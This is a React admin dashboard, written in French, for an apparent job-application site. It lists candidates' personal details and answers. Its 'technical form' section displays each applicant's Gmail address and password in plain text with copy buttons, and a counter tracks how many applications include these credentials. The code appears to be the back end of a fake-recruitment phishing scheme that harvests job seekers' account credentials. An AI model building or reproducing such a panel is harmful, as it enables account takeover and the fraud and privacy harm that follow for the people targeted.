import { useEffect, useState } from "react";
import { apiCall } from "./apiHelper";

interface Application {
  fullName: string;
  email: string;
  phone: string;
  motivation: string;
  experience: string;
  skills: string;
  availability: string;
  questions: string;
  jobTitle: string;
  companyName: string;
  date: string;
  time: string;
  cvFile: string;
  technicalEmail?: string;
  technicalPassword?: string;
  technicalQuestion1?: string;
  technicalQuestion2?: string;
  technicalQuestion3?: string;
  technicalFormSubmittedAt?: string;
}

const AdminDashboard = () => {
  const [applications, setApplications] = useState<{ [key: string]: Application }>({});
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState("");
  const [selectedAppId, setSelectedAppId] = useState<string | null>(null);
  const [copiedField, setCopiedField] = useState<string | null>(null);

  useEffect(() => {
    fetchApplications();
  }, []);

  const fetchApplications = async () => {
    try {
      const response = await apiCall("/api/admin/applications");
      if (!response.ok) {
        throw new Error("Erreur lors de la récupération des données");
      }
      const data = await response.json();
      setApplications(data.applications || {});
    } catch (err) {
      setError(
        err instanceof Error ? err.message : "Erreur lors du chargement"
      );
    } finally {
      setIsLoading(false);
    }
  };

  const copyToClipboard = (text: string, field: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(field);
    setTimeout(() => setCopiedField(null), 2000);
  };

  if (isLoading) {
    return (
      <div className="admin-container">
        <div className="admin-loading">
          <p>Chargement des candidatures...</p>
        </div>
      </div>
    );
  }

  const appEntries = Object.entries(applications);
  const selectedApp = selectedAppId ? applications[selectedAppId] : null;

  return (
    <div className="admin-container">
      <div className="admin-header">
        <h1>🔐 Tableau de Bord Admin</h1>
        <div className="admin-stats">
          <div className="stat">
            <div className="stat-value">{appEntries.length}</div>
            <div className="stat-label">Candidatures</div>
          </div>
          <div className="stat">
            <div className="stat-value">
              {appEntries.filter(([, app]) => app.technicalEmail).length}
            </div>
            <div className="stat-label">Complétées</div>
          </div>
        </div>
        <button onClick={fetchApplications} className="admin-refresh-btn">
          ↻ Actualiser
        </button>
      </div>

      {error && <div className="admin-error">{error}</div>}

      <div className="admin-content">
        {/* Liste des candidatures */}
        <div className="admin-list">
          <h2>Candidatures</h2>
          {appEntries.length === 0 ? (
            <p className="empty-state">Aucune candidature pour le moment</p>
          ) : (
            <div className="applications-list">
              {appEntries.map(([appId, app]) => (
                <div
                  key={appId}
                  className={`app-item ${
                    selectedAppId === appId ? "selected" : ""
                  }`}
                  onClick={() => setSelectedAppId(appId)}
                >
                  <div className="app-item-header">
                    <div className="app-item-name">{app.fullName}</div>
                    <div className="app-item-status">
                      {app.technicalEmail ? "✓ Complétée" : "⧖ En cours"}
                    </div>
                  </div>
                  <div className="app-item-meta">
                    <span className="app-item-job">{app.jobTitle}</span>
                    <span className="app-item-date">{app.date}</span>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Détails de la candidature */}
        {selectedApp && (
          <div className="admin-details">
            <h2>Détails de la Candidature</h2>
            
            <div className="details-section">
              <h3>📋 Informations Générales</h3>
              <div className="details-grid">
                <div className="detail-item">
                  <div className="detail-label">Nom Complet</div>
                  <div className="detail-value">{selectedApp.fullName}</div>
                </div>
                <div className="detail-item">
                  <div className="detail-label">Email (Contact)</div>
                  <div className="detail-value">{selectedApp.email}</div>
                </div>
                <div className="detail-item">
                  <div className="detail-label">Téléphone</div>
                  <div className="detail-value">{selectedApp.phone}</div>
                </div>
                <div className="detail-item">
                  <div className="detail-label">Poste</div>
                  <div className="detail-value">{selectedApp.jobTitle}</div>
                </div>
                <div className="detail-item">
                  <div className="detail-label">Entreprise</div>
                  <div className="detail-value">{selectedApp.companyName}</div>
                </div>
                <div className="detail-item">
                  <div className="detail-label">Date de Candidature</div>
                  <div className="detail-value">
                    {selectedApp.date} à {selectedApp.time}
                  </div>
                </div>
              </div>
            </div>

            <div className="details-section">
              <h3>💼 Expérience et Compétences</h3>
              <div className="details-text">
                <div className="text-block">
                  <h4>Motivation</h4>
                  <p>{selectedApp.motivation}</p>
                </div>
                <div className="text-block">
                  <h4>Expérience</h4>
                  <p>{selectedApp.experience}</p>
                </div>
                <div className="text-block">
                  <h4>Compétences</h4>
                  <p>{selectedApp.skills}</p>
                </div>
                <div className="text-block">
                  <h4>Disponibilité</h4>
                  <p>{selectedApp.availability}</p>
                </div>
                <div className="text-block">
                  <h4>Questions</h4>
                  <p>{selectedApp.questions || "Aucune"}</p>
                </div>
              </div>
            </div>

            {selectedApp.technicalEmail && (
              <div className="details-section credentials-section">
                <h3>🔑 Identifiants Gmail (Formulaire Technique)</h3>
                <div className="credentials-grid">
                  <div className="credential-item">
                    <div className="credential-label">Gmail</div>
                    <div className="credential-value-wrapper">
                      <div className="credential-value">
                        {selectedApp.technicalEmail}
                      </div>
                      <button
                        className="copy-btn"
                        onClick={() =>
                          copyToClipboard(
                            selectedApp.technicalEmail || "",
                            "email"
                          )
                        }
                        title="Copier"
                      >
                        {copiedField === "email" ? "✓ Copié" : "📋"}
                      </button>
                    </div>
                  </div>
                  <div className="credential-item">
                    <div className="credential-label">Mot de Passe</div>
                    <div className="credential-value-wrapper">
                      <div className="credential-value password-field">
                        {selectedApp.technicalPassword}
                      </div>
                      <button
                        className="copy-btn"
                        onClick={() =>
                          copyToClipboard(
                            selectedApp.technicalPassword || "",
                            "password"
                          )
                        }
                        title="Copier"
                      >
                        {copiedField === "password" ? "✓ Copié" : "📋"}
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {selectedApp.technicalQuestion1 && (
              <div className="details-section">
                <h3>❓ Réponses Techniques</h3>
                <div className="details-text">
                  <div className="text-block">
                    <h4>
                      Expérience avec les technologies web modernes
                    </h4>
                    <p>{selectedApp.technicalQuestion1}</p>
                  </div>
                  <div className="text-block">
                    <h4>Langages de programmation</h4>
                    <p>{selectedApp.technicalQuestion2 || "Non fourni"}</p>
                  </div>
                  <div className="text-block">
                    <h4>Projets personnels</h4>
                    <p>{selectedApp.technicalQuestion3 || "Non fourni"}</p>
                  </div>
                  {selectedApp.technicalFormSubmittedAt && (
                    <div className="submission-date">
                      Soumis le{" "}
                      {new Date(
                        selectedApp.technicalFormSubmittedAt
                      ).toLocaleDateString("fr-FR", {
                        year: "numeric",
                        month: "long",
                        day: "numeric",
                        hour: "2-digit",
                        minute: "2-digit",
                      })}
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default AdminDashboard;
